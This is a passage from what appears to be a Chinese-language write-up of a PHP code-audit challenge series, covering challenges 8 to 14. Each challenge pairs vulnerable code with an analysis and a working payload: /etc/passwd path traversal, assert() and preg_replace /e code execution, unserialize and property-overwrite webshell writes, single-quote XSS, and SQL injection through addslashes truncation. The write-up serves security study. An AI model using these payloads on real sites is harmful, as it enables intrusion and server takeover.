极其容易导致变量覆盖漏洞，</p><p>另外<code>$_SERVER[&#39;HTTP_REFERER&#39;]</code> 是可控的，改下 <code>Referer</code> 头即可。</p><blockquote><p>要获取当前的 <em>QUERY_STRING</em>，可以使用 <a href="https://php.net/manual/zh/reserved.variables.server.php" target="_blank" rel="noopener">$_SERVER[‘QUERY_STRING’]</a> 变量。 </p></blockquote><p>注意到第二行 <code>global $config, $db</code>，可以覆盖掉它，从而接入我们的数据库。</p><h3 id="payload-6"><a href="#payload-6" class="headerlink" title="payload"></a>payload</h3><p>修改 <code>Referer</code> 头</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="link">http://host/?config</span>[<span class="string">dbhost</span>]=vps<span class="emphasis">_ip&amp;config[dbuser]=root&amp;config[dbpass]=root&amp;config[dbname]=attack&amp;id=1</span></span><br></pre></td></tr></table></figure><h2 id="8-Candle"><a href="#8-Candle" class="headerlink" title="8 - Candle"></a>8 - Candle</h2><blockquote><p>preg_replace /e</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">header(<span class="string">"Content-Type: text/plain"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complexStrtolower</span><span class="params">($regex, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> preg_replace(</span><br><span class="line">        <span class="string">'/('</span> . $regex . <span class="string">')/ei'</span>,</span><br><span class="line">        <span class="string">'strtolower("\\1")'</span>,</span><br><span class="line">        $value</span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $regex =&gt; $value) &#123;</span><br><span class="line">    <span class="keyword">echo</span> complexStrtolower($regex, $value) . <span class="string">"\n"</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>preg_replace()</code> 的 <code>e</code> 模式可以 RCE</p><h3 id="分析-7"><a href="#分析-7" class="headerlink" title="分析"></a>分析</h3><h2 id="9-Rabbit"><a href="#9-Rabbit" class="headerlink" title="9 - Rabbit"></a>9 - Rabbit</h2><blockquote><p>str_replace</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LanguageManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $lang = <span class="keyword">$this</span>-&gt;getBrowserLanguage();</span><br><span class="line">        $sanitizedLang = <span class="keyword">$this</span>-&gt;sanitizeLanguage($lang);</span><br><span class="line">        <span class="keyword">require_once</span>(<span class="string">"/lang/$sanitizedLang"</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">getBrowserLanguage</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $lang = $_SERVER[<span class="string">'HTTP_ACCEPT_LANGUAGE'</span>] ?? <span class="string">'en'</span>;</span><br><span class="line">        <span class="keyword">return</span> $lang;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeLanguage</span><span class="params">($language)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> str_replace(<span class="string">'../'</span>, <span class="string">''</span>, $language);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">(<span class="keyword">new</span> LanguageManager())-&gt;loadLanguage();</span><br></pre></td></tr></table></figure><h3 id="分析-8"><a href="#分析-8" class="headerlink" title="分析"></a>分析</h3><p>$_SERVER[‘HTTP_ACCEPT_LANGUAGE’]` 是可控的，可以尝试文件包含。</p><p><img src="http://ww1.sinaimg.cn/large/de75fd55gy1g1f3gicodej20t207dab2.jpg" alt></p><p>这里的过滤太弱了，只是简单的替换一下，可将 <code>\/</code> 都删掉。</p><blockquote><p>如果没有一些特殊的替换需求（比如正则表达式），你应该使用该函数替换 <a href="https://php.net/manual/zh/function.ereg-replace.php" target="_blank" rel="noopener">ereg_replace()</a> 和 <a href="https://php.net/manual/zh/function.preg-replace.php" target="_blank" rel="noopener">preg_replace()</a></p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print_r(str_replace(<span class="string">"../"</span>,<span class="string">""</span>,<span class="string">"....//"</span>));</span><br><span class="line"><span class="comment">// ../</span></span><br></pre></td></tr></table></figure><h3 id="payload-7"><a href="#payload-7" class="headerlink" title="payload"></a>payload</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Accept-Language: .<span class="regexp">//</span>....<span class="regexp">//</span>....<span class="regexp">//</span>etc<span class="regexp">/passwd</span></span><br></pre></td></tr></table></figure><h2 id="10-Anticipation"><a href="#10-Anticipation" class="headerlink" title="10 - Anticipation"></a>10 - Anticipation</h2><blockquote><p>未正确 exit</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">extract($_POST);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">goAway</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    error_log(<span class="string">"Hacking attempt."</span>);</span><br><span class="line">    header(<span class="string">'Location: /error/'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>($pi) || !is_numeric($pi)) &#123;</span><br><span class="line">    goAway();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!assert(<span class="string">"(int)$pi == 3"</span>)) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This is not pi."</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">"This might be pi."</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-9"><a href="#分析-9" class="headerlink" title="分析"></a>分析</h3><p>该代码的大致意思是输入一个 <code>pi</code>，验证是否为数字类型，非数字将重定向到错误页面。</p><p><code>assert()</code> RCE 可以参考这篇文章 <a href="https://www.cnblogs.com/sn00py/p/5925944.html" target="_blank" rel="noopener">assert引起的代码注射</a>，另外<code>extract()</code> 很容易引起变量覆盖。</p><h3 id="payload-8"><a href="#payload-8" class="headerlink" title="payload"></a>payload</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">pi=phpinfo()</span><br></pre></td></tr></table></figure><p>PS:这里的 <code>phpinfo</code> 不太好看到，写个 <code>webshell</code> 进去再看。</p><h2 id="11-Pumpkin-Pie"><a href="#11-Pumpkin-Pie" class="headerlink" title="11 - Pumpkin Pie"></a>11 - Pumpkin Pie</h2><blockquote><p>unserialize</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'/tmp/cachefile'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;div&gt;Welcome back %s&lt;/div&gt;'</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($data = null)</span> </span>&#123;</span><br><span class="line">        $data = <span class="keyword">$this</span>-&gt;loadData($data);</span><br><span class="line">        <span class="keyword">$this</span>-&gt;render($data);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">loadData</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (substr($data, <span class="number">0</span>, <span class="number">2</span>) !== <span class="string">'O:'</span></span><br><span class="line">            &amp;&amp; !preg_match(<span class="string">'/O:\d:\/'</span>, $data)) &#123;</span><br><span class="line">            <span class="keyword">return</span> unserialize($data);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> [];</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">createCache</span><span class="params">($file = null, $tpl = null)</span> </span>&#123;</span><br><span class="line">        $file = $file ?? <span class="keyword">$this</span>-&gt;cacheFile;</span><br><span class="line">        $tpl = $tpl ?? <span class="keyword">$this</span>-&gt;template;</span><br><span class="line">        file_put_contents($file, $tpl);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">render</span><span class="params">($data)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> sprintf(</span><br><span class="line">            <span class="keyword">$this</span>-&gt;template,</span><br><span class="line">            htmlspecialchars($data[<span class="string">'name'</span>])</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;createCache();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">new</span> Template($_COOKIE[<span class="string">'data'</span>]);</span><br></pre></td></tr></table></figure><h3 id="分析-10"><a href="#分析-10" class="headerlink" title="分析"></a>分析</h3><p><code>createCache()</code> 里面有个 <code>file_put_contents()</code> 可以拿来写 <code>shell</code> ，再结合一下 <code>__destruct()</code> 构造反序列化漏洞来利用。</p><p><code>loadData()</code> 本意可能是想反序列化一个数组，有简单的过滤，但是<code>preg_match()</code> 这里的 <code>\</code> 写的有问题，造成正则匹配过滤失效。</p><p><strong>魔术方法</strong></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">__wakeup() <span class="comment">//使用unserialize时触发</span></span><br><span class="line">__sleep() <span class="comment">//使用serialize时触发</span></span><br><span class="line">__destruct() <span class="comment">//对象被销毁时触发</span></span><br><span class="line">__call() <span class="comment">//在对象上下文中调用不可访问的方法时触发</span></span><br><span class="line">__callStatic() <span class="comment">//在静态上下文中调用不可访问的方法时触发</span></span><br><span class="line">__get() <span class="comment">//用于从不可访问的属性读取数据</span></span><br><span class="line">__set() <span class="comment">//用于将数据写入不可访问的属性</span></span><br><span class="line">__isset() <span class="comment">//在不可访问的属性上调用isset()或empty()触发</span></span><br><span class="line">__unset() <span class="comment">//在不可访问的属性上使用unset()时触发</span></span><br><span class="line">__toString() <span class="comment">//把类当作字符串使用时触发</span></span><br><span class="line">__invoke() <span class="comment">//当脚本尝试将对象调用为函数时触发</span></span><br></pre></td></tr></table></figure><h3 id="payload-9"><a href="#payload-9" class="headerlink" title="payload"></a>payload</h3><ul><li>将对象放到数组里</li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Template</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $cacheFile = <span class="string">'shell.php'</span>;</span><br><span class="line">    <span class="keyword">public</span> $template = <span class="string">'&lt;?php eval($_GET[1]); ?&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$arr = <span class="keyword">array</span>(<span class="keyword">new</span> Template);</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($arr));</span><br><span class="line"></span><br><span class="line"><span class="comment">// a:1:&#123;i:0;O:8:"Template":2:&#123;s:9:"cacheFile";s:9:"shell.php";s:8:"template";s:24:"<span class="meta">&lt;?php</span> eval($_GET[1]); <span class="meta">?&gt;</span>";&#125;&#125;</span></span><br><span class="line"><span class="comment">// 即可成功写入 shell.php</span></span><br></pre></td></tr></table></figure><ul><li>如果正则配置正确，<code>O:+8</code> 绕过 <a href="https://www.phpbug.cn/archives/32.html" target="_blank" rel="noopener">php反序列unserialize的一个小特性</a></li></ul><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a:<span class="number">1</span>:&#123;i:<span class="number">0</span>;O:<span class="number">8</span>:<span class="string">"Template"</span>:<span class="number">2</span>:&#123;s:<span class="number">9</span>:<span class="string">"cacheFile"</span>;s:<span class="number">9</span>:<span class="string">"shell.php"</span>;s:<span class="number">8</span>:<span class="string">"template"</span>;s:<span class="number">24</span>:<span class="string">"&lt;?php eval($_GET[1]); ?&gt;"</span>;&#125;&#125;</span><br></pre></td></tr></table></figure><h2 id="12-String-Lights"><a href="#12-String-Lights" class="headerlink" title="12 - String Lights"></a>12 - String Lights</h2><blockquote><p>htmlentities</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">$sanitized = [];</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $key =&gt; $value) &#123;</span><br><span class="line">    $sanitized[$key] = intval($value);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$queryParts = array_map(</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="params">($key, $value)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> $key . <span class="string">'='</span> . $value;</span><br><span class="line">&#125;, array_keys($sanitized), array_values($sanitized));</span><br><span class="line"></span><br><span class="line">$query = implode(<span class="string">'&amp;'</span>, $queryParts);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;a href='/images/size.php?"</span> .</span><br><span class="line">    htmlentities($query) . <span class="string">"'&gt;link&lt;/a&gt;"</span>;</span><br></pre></td></tr></table></figure><h3 id="分析-11"><a href="#分析-11" class="headerlink" title="分析"></a>分析</h3><p>先看一下这两个函数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">implode ( string $glue , <span class="keyword">array</span> $pieces ) : string</span><br><span class="line"><span class="comment">// 用 glue 将一维数组中的值拼接起来</span></span><br><span class="line">    </span><br><span class="line">htmlentities ( string $string [, int $flags = ENT_COMPAT | ENT_HTML401 [, string $encoding = ini_get(<span class="string">"default_charset"</span>) [, bool $double_encode = <span class="keyword">true</span> ]]] ) : string</span><br><span class="line"><span class="comment">// 将字符转换为 HTML 转义字符，也就是对一些特殊字符进行 HTML 实体编码</span></span><br><span class="line"><span class="comment">// 本函数各方面都和 htmlspecialchars() 一样， 除了 htmlentities() 会转换所有具有 HTML 实体字符</span></span><br></pre></td></tr></table></figure><p>上面的代码用的是 <code>htmlentities()</code> 的默认参数</p><blockquote><p><strong>ENT_COMPAT</strong>  | 会转换双引号，不转换单引号 </p><p><strong>ENT_HTML401</strong> | 以 HTML 4.01 处理代码</p></blockquote><p>也就是说，不会对单引号进行实体编码。</p><h3 id="payload-10"><a href="#payload-10" class="headerlink" title="payload"></a>payload</h3><p>可以构造一个事件去触发 xss</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">''</span> <span class="attr">onmouseover</span>=<span class="string">alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">''</span> <span class="attr">onclick</span>=<span class="string">alert(1)</span>&gt;</span>xss<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果直接提交</p><figure class="highlight scheme"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">'onmouseover=alert</span>(<span class="name">1</span>)</span><br><span class="line"><span class="symbol">'onclick=alert</span>(<span class="name">1</span>)</span><br></pre></td></tr></table></figure><p>显然是不行的，<code>alert(1)</code> 将被 <code>intval</code> 掉，这时候可以将等号编码为 <code>%3D</code> ，然后再加个等号。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">'onmouseover%3Dalert(1)//=1</span></span><br><span class="line"><span class="string">'</span>onclick%<span class="number">3</span>Dalert(<span class="number">1</span>)<span class="comment">//=1</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// $_GET</span></span><br><span class="line"><span class="keyword">Array</span> (</span><br><span class="line">[<span class="string">'onmouseover=alert(1)//] =&gt; 1</span></span><br><span class="line"><span class="string">    ['</span>onclick=alert(<span class="number">1</span>)<span class="comment">//] =&gt; 1</span></span><br><span class="line">)</span><br></pre></td></tr></table></figure><p>最终形成的 <code>payload</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/images/size.php?'</span><span class="attr">onmouseover</span>=<span class="string">alert(1)//</span>=<span class="string">1</span>'&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">'/images/size.php?'</span><span class="attr">onclick</span>=<span class="string">alert(1)//</span>=<span class="string">1</span>'&gt;</span>link<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br></pre></td></tr></table></figure><p>如果可控点在 <code>href</code></p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">javascript:alert(1)</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg</span>==&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">data:text/html;%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%31%29%3c%2f%73%63%72%69%70%74%3e</span>&gt;</span></span><br></pre></td></tr></table></figure><h2 id="13-Turkey-Baster"><a href="#13-Turkey-Baster" class="headerlink" title="13 - Turkey Baster"></a>13 - Turkey Baster</h2><blockquote><p>截断惹的祸</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">LoginManager</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $em;</span><br><span class="line">    <span class="keyword">private</span> $user;</span><br><span class="line">    <span class="keyword">private</span> $password;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($user, $password)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;em = DoctrineManager::getEntityManager();</span><br><span class="line">        <span class="keyword">$this</span>-&gt;user = $user;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;password = $password;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">isValid</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        $user = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;user);</span><br><span class="line">        $pass = <span class="keyword">$this</span>-&gt;sanitizeInput(<span class="keyword">$this</span>-&gt;password);</span><br><span class="line"></span><br><span class="line">        $queryBuilder = <span class="keyword">$this</span>-&gt;em-&gt;createQueryBuilder()</span><br><span class="line">            -&gt;select(<span class="string">"COUNT(p)"</span>)</span><br><span class="line">            -&gt;from(<span class="string">"User"</span>, <span class="string">"u"</span>)</span><br><span class="line">            -&gt;where(<span class="string">"user = '$user' AND password = '$pass'"</span>);</span><br><span class="line">        $query = $queryBuilder-&gt;getQuery();</span><br><span class="line">        <span class="keyword">return</span> boolval($query-&gt;getSingleScalarResult());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">sanitizeInput</span><span class="params">($input, $length = <span class="number">20</span>)</span> </span>&#123;</span><br><span class="line">        $input = addslashes($input);</span><br><span class="line">        <span class="keyword">if</span> (strlen($input) &gt; $length) &#123;</span><br><span class="line">            $input = substr($input, <span class="number">0</span>, $length);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> $input;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$auth = <span class="keyword">new</span> LoginManager($_POST[<span class="string">'user'</span>], $_POST[<span class="string">'passwd'</span>]);</span><br><span class="line"><span class="keyword">if</span> (!$auth-&gt;isValid()) &#123;</span><br><span class="line">    <span class="keyword">exit</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="分析-12"><a href="#分析-12" class="headerlink" title="分析"></a>分析</h3><p>注意到两个参数都被 <code>addslashes()</code> 转义，而且将被截断。</p><p>如果没有这个截断操作，有 <code>addslashes()</code> 加持还是会安全很多，有了截断就可以搞事情了，“逃逸”一个 <code>\</code> 出来将 <code>‘</code> 吃掉。</p><h3 id="payload-11"><a href="#payload-11" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">user=<span class="number">1234567890123456789</span>\&amp;passwd=<span class="keyword">or</span> <span class="number">1</span><span class="comment">#</span></span><br></pre></td></tr></table></figure><p>形成的 <code>sql</code> 语句</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">where user = '1234567890123456789\' AND password = 'or 1<span class="comment">#'</span></span><br></pre></td></tr></table></figure><h2 id="14-Snowman"><a href="#14-Snowman" class="headerlink" title="14 - Snowman"></a>14 - Snowman</h2><blockquote><p>变量覆盖</p></blockquote><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Carrot</span> </span>&#123;</span><br><span class="line">    <span class="keyword">const</span> EXTERNAL_DIRECTORY = <span class="string">'/tmp/'</span>;</span><br><span class="line">    <span class="keyword">private</span> $id;</span><br><span class="line">    <span class="keyword">private</span> $lost = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> $bought = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($input)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;id = rand(<span class="number">1</span>, <span class="number">1000</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">foreach</span> ($input <span class="keyword">as</span> $field =&gt; $count) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$field = $count++;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        file_put_contents(</span><br><span class="line">            <span class="keyword">self</span>::EXTERNAL_DIRECTORY . <span class="keyword">$this</span>-&gt;id,</span><br><span class="line">            var_export(get_object_vars(<span class="keyword">$this</span>), <span class="keyword">true</span>)</span><br><span class="line">        );</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$carrot = <span class="keyword">new</span> Carrot($_GET);</span><br></pre></td></tr></table></figure><h3 id="分析-13"><a href="#分析-13" class="headerlink" title="分析"></a>分析</h3><p>这里有一个明显的变量覆盖漏洞，<code>id</code> 尽管被赋上了随机数，但实际上还是可控的。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_put_contents ( string $filename , mixed $data [, int $flags = <span class="number">0</span> [, resource $context ]] ) : int</span><br></pre></td></tr></table></figure><blockquote><p>PHP 有个好玩的地方，能传 <code>$filename</code> 的地方，基本上可以用 PHP 伪协议流。</p><p>可惜这里的 EXTERNAL_DIRECTORY 不可控，不好用其他技巧了。</p><p>想深入了解可以参考 ph 师傅的这篇文章，<a href="https://www.leavesongs.com/PENETRATION/php-filter-magic.html" target="_blank" rel="noopener">谈一谈php://filter的妙用</a></p></blockquote><p><code>get_object_vars($this)</code> 没有采取任何过滤，可直接写入 <code>webshell</code>。</p><h3 id="payload-12"><a href="#payload-12" class="headerlink" title="payload"></a>payload</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">id=../../<span class="keyword">var</span>/www/html/shell.php&amp;t=<span class="meta">&lt;?php</span>%<span class="number">20</span><span class="keyword">eval</span>($_GET[<span 